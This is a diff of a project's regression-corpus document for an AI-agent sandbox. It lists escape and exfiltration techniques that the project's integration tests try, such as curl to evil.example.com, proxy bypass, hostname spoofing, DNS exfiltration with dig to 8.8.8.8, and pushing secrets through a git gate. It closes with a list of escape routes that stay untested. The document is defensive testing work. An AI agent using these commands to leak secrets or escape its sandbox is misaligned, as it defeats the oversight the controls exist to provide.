@@ -1,129 +1,168 @@
-# Sandbox Escape Attempt Corpus
+# Sandbox escape regression corpus
 
-Append-only log of attack techniques attempted against bot-bottle, each with a date,
-description, outcome, and a reference to the regression test that catches it. New
-techniques go at the bottom.
+A log of the escape and exfiltration techniques the project's own end-to-end
+suite tries against a real bottle. It is a regression corpus written by the
+project, not the result of outside red-teaming. New techniques go at the
+bottom.
 
-Every entry here has a corresponding test in
-`tests/integration/test_sandbox_escape.py`.
+Each entry names the test and `subTest` that runs it, in
+`tests/integration/test_sandbox_escape.py` (class `TestSandboxEscape`). The
+date is when that attack first went into the suite, from git history. The
+suite brings up one bottle whose only allowlisted host is the Claude
+provider's `api.anthropic.com` route, with planted fake secrets and a git-gate
+repo whose upstream is unreachable.
+
+## Where it runs
+
+- **Docker**: every pull request and push to `main`, on Gitea and on GitHub's
+  hosted runners. That job must run all integration tests with none skipped
+  ([ci.md](../reference/ci.md)).
+- **Firecracker and macos-container**: only in the manually dispatched
+  pre-release matrix, on self-hosted runners (macOS is advisory). Those jobs
+  don't have the no-skip gate, so a skipped test there doesn't fail the job.
+
+So on every change the corpus proves the Docker backend only. Firecracker and
+Apple container isolation is exercised before releases, not per change.
 
 ---
 
-## 2024 — Initial corpus
-
-### 2024-XX-XX · Non-allowlisted hostname request
-**Technique**: `curl https://evil.example.com/` from inside an agent.  
-**Outcome**: Blocked. Egress proxy returns 403 with `egress:` marker before any upstream contact.  
-**Test**: `test_non_allowlisted_hostname`
+### Non-allowlisted hostname
+**Since**: 2026-05-26  
+**Technique**: `curl https://evil.example.com/` from inside the agent.  
+**Outcome**: Refused. The test checks only that curl (`--fail`) exits non-zero.  
+**Test**: `test_1_hostname_not_in_allowlist`
 
 ---
 
-### 2024-XX-XX · Direct IP literal connect
+### Direct IP literal
+**Since**: 2026-05-26  
 **Technique**: `curl https://198.51.100.1/` (RFC 5737 documentation range).  
-**Outcome**: Connection refused at network layer. Agent has no default gateway.  
-**Test**: `test_non_allowlisted_ip_direct`
+**Outcome**: Refused. The test checks only that curl exits non-zero.  
+**Test**: `test_2_ip_not_in_allowlist`, subTest `attack="direct IP"`
 
 ---
 
-### 2024-XX-XX · Proxy bypass via --noproxy
-**Technique**: `curl --noproxy '*' https://198.51.100.1/` to dial a public address without going through the egress proxy.  
-**Outcome**: Blocked. Network isolation; no direct route off-host regardless of proxy settings.  
-**Test**: `test_noproxy_bypass`
+### Proxy bypass
+**Since**: 2026-10-22  
+**Technique**: `curl --noproxy '*' http://1.1.1.1/` to dial a public address without the egress proxy.  
+**Outcome**: No connection. The agent's network has no route off the host except through the gateway; any HTTP status at all would count as a leak.  
+**Test**: `test_2_ip_not_in_allowlist`, subTest `attack="proxy bypass"`
 
 ---
 
-### 2024-XX-XX · Host header spoof (--resolve)
-**Technique**: `curl --resolve api.anthropic.com:443:198.51.100.1 https://api.anthropic.com/` to misdirect an allowed hostname to an unrelated IP.  
-**Outcome**: Blocked. Proxy keys policy on actual CONNECT target, not Host header. SNI checked against connection target.  
-**Test**: `test_host_header_spoof_resolve`
+### Allowed hostname resolved to another IP (`--resolve`)
+**Since**: 2026-05-26  
+**Technique**: `curl --resolve api.anthropic.com:443:198.51.100.1 https://api.anthropic.com/` to send an allowed name to an unrelated address.  
+**Outcome**: The address is never used: through a proxy, curl's `--resolve` doesn't apply to the target, and the gateway resolves the name itself. The test checks only that curl (`--fail`) exits non-zero, so an error status from the real host would also pass it.  
+**Test**: `test_2_ip_not_in_allowlist`, subTest `attack="host-header spoof"`
 
 ---
 
-### 2024-XX-XX · CONNECT tunnel with spoofed Host header
-**Technique**: CONNECT to unlisted host, inner request sets `Host: api.anthropic.com`.  
-**Outcome**: Blocked. Proxy refuses CONNECT to unlisted host before inner request is read.  
-**Test**: `test_connect_tunnel_spoof`
+### CONNECT to an unlisted host with a listed `Host`
+**Since**: 2026-10-26  
+**Technique**: HTTPS to `example.com` with `Host: api.anthropic.com`, so the request inside the tunnel would be policed (and given credentials) as the allowed host.  
+**Outcome**: The `CONNECT` itself gets a 403; no tunnel is opened.  
+**Test**: `test_2_ip_not_in_allowlist`, subTest `attack="CONNECT to unlisted host, Host names a listed one"`
 
 ---
 
-### 2024-XX-XX · HTTP exfil via URL path
-**Technique**: Embed secret in URL path of request to an allowed host.  
-**Outcome**: Blocked. Outbound DLP (known-secrets detector) catches value in path before upstream contact.  
-**Test**: `test_http_exfil_path`
+### Plain HTTP to an unlisted host with a listed `Host`
+**Since**: 2026-10-26  
+**Technique**: `http://example.com/` with `Host: api.anthropic.com`.  
+**Outcome**: 403 from the gateway with an egress marker.  
+**Test**: `test_2_ip_not_in_allowlist`, subTest `attack="plain HTTP to unlisted host, Host names a listed one"`
 
 ---
 
-### 2024-XX-XX · HTTP exfil via query string
-**Technique**: Embed secret in query string of request to an allowed host.  
-**Outcome**: Blocked. Outbound DLP catches value in query before upstream contact.  
-**Test**: `test_http_exfil_query`
+### CONNECT to another port
+**Since**: 2026-10-26  
+**Technique**: `https://example.com:22/`, a tunnel that could carry raw TCP.  
+**Outcome**: The `CONNECT` gets a 403.  
+**Test**: `test_2_ip_not_in_allowlist`, subTest `attack="CONNECT to an unlisted host's other port"`
 
 ---
 
-### 2024-XX-XX · HTTP exfil via request body
-**Technique**: POST JSON body containing secret to an allowed host.  
-**Outcome**: Blocked. Outbound DLP catches value in body before upstream contact.  
-**Test**: `test_http_exfil_body`
+### Secret in path, query, body or header
+**Since**: 2026-05-26  
+**Technique**: A planted secret in the URL path, the query string, a JSON POST body, and an `X-Custom` header, each to `raw.githubusercontent.com`.  
+**Outcome**: 403 with an egress marker, or a refusal at `CONNECT`. The destination is not on the allowlist, so this exercises the allowlist, not DLP on an allowed host. Outbound DLP on allowed hosts is covered by unit tests (`tests/unit/test_dlp_detectors.py`, `tests/unit/test_egress_addon_request_flow.py`), not by this suite.  
+**Test**: `test_3_http_exfil_blocked`, subTests `shape="path"`, `"query"`, `"body"`, `"header"`
 
 ---
 
-### 2024-XX-XX · HTTP exfil via request header
-**Technique**: Custom header (`X-Custom: <secret>`) on request to an allowed host.  
-**Outcome**: Blocked. Outbound DLP catches value in headers before upstream contact.  
-**Test**: `test_http_exfil_header`
+### Secret in a subdomain of an allowed host
+**Since**: 2026-05-26  
+**Technique**: `https://$SECRET.api.anthropic.com/`, which looks like it's under the allowed name.  
+**Outcome**: Refused. The allowlist matches the exact host. The test checks only that curl exits non-zero.  
+**Test**: `test_4_dns_exfil_blocked`, subTest `attack="crafted subdomain"`
 
 ---
 
-### 2024-XX-XX · DNS exfil via crafted subdomain
-**Technique**: Request to `$SECRET.api.anthropic.com` — looks allowlisted by substring but isn't.  
-**Outcome**: Blocked. Exact-match allowlist rejects it; no DNS query is issued.  
-**Test**: `test_dns_exfil_subdomain`
+### Direct DNS query to a public resolver
+**Since**: 2026-05-26  
+**Technique**: `dig @8.8.8.8 "$SECRET.example.com"`.  
+**Outcome**: No reply. Any reply, even NXDOMAIN, would mean the query left the host.  
+**Test**: `test_4_dns_exfil_blocked`, subTest `attack="direct dig"`
 
 ---
 
-### 2024-XX-XX · DNS exfil via direct query to external resolver
-**Technique**: `dig @8.8.8.8 "$SECRET.example.com"` — bypass proxy entirely, query external DNS.  
-**Outcome**: Blocked. Network isolation; no route to 8.8.8.8. No response.  
-**Test**: `test_dns_exfil_direct_query`
+### The runtime's own resolver
+**Since**: 2026-10-22  
+**Technique**: `dig example.com` against the resolver the container or VM is given.  
+**Outcome**: The name doesn't resolve, so that resolver isn't a channel off the host.  
+**Test**: `test_4_dns_exfil_blocked`, subTest `attack="runtime resolver"`
 
 ---
 
-### 2024-XX-XX · Git push with GitHub token shape
-**Technique**: Commit README containing `ghp_...` token, push via git-gate.  
-**Outcome**: Blocked. gitleaks pre-receive hook finds the token before upstream SSH attempt.  
-**Test**: `test_gitleaks_secret_in_push_github`
+### Token-shaped secret pushed through git-gate
+**Since**: 2026-05-26 (the current GitHub, Slack and GitLab shapes since 2026-07-11)  
+**Technique**: Commit a README linking to an attacker URL with a `ghp_…`, `xoxb-…` or `glpat-…` token in it, and push through git-gate.  
+**Outcome**: Refused by gitleaks in pre-receive, before git-gate tries the upstream (the output must name gitleaks and carry no upstream network error).  
+**Test**: `test_5_readme_push_blocked`, subTests `secret="github"`, `"slack"`, `"gitlab"`
 
 ---
 
-### 2024-XX-XX · Git push with Slack token shape
-**Technique**: Commit file containing `xoxb-...` token, push via git-gate.  
-**Outcome**: Blocked. gitleaks pre-receive hook.  
-**Test**: `test_gitleaks_secret_in_push_slack`
+### The bottle's own shapeless secret pushed
+**Since**: 2026-10-23  
+**Technique**: Commit a bottle env secret (a `?` value) that has no token shape gitleaks knows, and push.  
+**Outcome**: Refused by git-gate's held-secret scan (`gateway/git_gate/held_secret_scan.py`), which matches the bottle's registered secret values.  
+**Test**: `test_6_held_secrets_never_leave`, subTest `attack="push secret env value"`
 
 ---
 
-### 2024-XX-XX · Git push with GitLab token shape
-**Technique**: Commit file containing `glpat-...` token, push via git-gate.  
-**Outcome**: Blocked. gitleaks pre-receive hook.  
-**Test**: `test_gitleaks_secret_in_push_gitlab`
+### The canary pushed
+**Since**: 2026-10-23  
+**Technique**: Commit the bottle's per-session canary value and push.  
+**Outcome**: Refused by the held-secret scan.  
+**Test**: `test_6_held_secrets_never_leave`, subTest `attack="push canary"`
 
 ---
 
-### 2024-XX-XX · Git push with shapeless secret (no gitleaks rule)
-**Technique**: Commit file containing a bare hex secret with no known token prefix. gitleaks has no rule for this shape.  
-**Outcome**: Blocked. Held-secret scan (`held_secret_scan.py`) catches the value by exact match on the bottle's registered `HELD_*` secrets.  
-**Test**: `test_shapeless_secret_in_push`
+### The canary sent to an allowlisted host
+**Since**: 2026-10-23  
+**Technique**: POST the canary in a JSON body to `api.anthropic.com`, which is allowed.  
+**Outcome**: 403 from egress DLP naming `HELD_CANARY`. The canary check runs on every inspected route, whatever the route's DLP settings. On an `inspect: false` route it isn't seen ([gateway.md](../reference/gateway.md#outbound-dlp)).  
+**Test**: `test_6_held_secrets_never_leave`, subTest `attack="canary to an allowlisted host"`
 
 ---
 
-### 2024-XX-XX · Git push containing per-session canary
-**Technique**: Commit file containing the per-session `HELD_CANARY` value, push via git-gate.  
-**Outcome**: Blocked. Held-secret scan catches canary value (included in `HELD_*` scan).  
-**Test**: `test_canary_in_push`
+## Not covered yet
 
----
+The suite doesn't attempt:
 
-### 2024-XX-XX · Canary exfil to allowlisted host via HTTP body
-**Technique**: POST request body containing per-session `HELD_CANARY` to an *allowlisted* host.  
-**Outcome**: Blocked. Canary detector in outbound DLP always hard-blocks regardless of route policy.  
-**Test**: `test_canary_to_allowed_host`
+- **Escaping the VM or container**: kernel or hypervisor exploits, container
+  runtime escapes, or a root-capable agent removing its in-guest firewall on
+  macos-container ([backends.md](../reference/backends.md#agents-cant-reach-each-other)).
+- **The control plane from inside a bottle**: reaching or abusing the
+  orchestrator or the host controller. Control-plane authentication and
+  per-bottle token and allowlist isolation have their own Docker integration
+  tests (`test_orchestrator_docker_auth.py`, `test_multitenant_isolation.py`),
+  which don't attack from inside an agent.
+- **Getting past the trust prompt**: a repository's bottle or agent gaining
+  grants without this host trusting it.
+- **`inspect: false` routes**: the suite's bottle has none, so nothing tests
+  what an unscanned tunnel can carry.
+- **Outbound DLP on an allowed host** for planted secrets, beyond the canary:
+  see the path, query, body and header entry above.
+- **The console link**: what a paired console can do to the host
+  ([host-controller.md](../reference/host-controller.md#what-pairing-lets-the-console-do)).
